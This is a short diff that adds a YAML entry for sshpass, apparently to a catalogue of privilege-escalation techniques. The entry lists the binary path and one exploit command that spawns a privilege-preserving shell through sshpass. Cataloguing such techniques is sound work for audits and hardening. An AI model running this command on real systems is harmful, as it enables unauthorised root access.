@@ -1,0 +1,4 @@
+name: sshpass
+binary_path: /usr/bin/sshpass
+exploit_cmds:
+- /usr/bin/sshpass /bin/sh -p
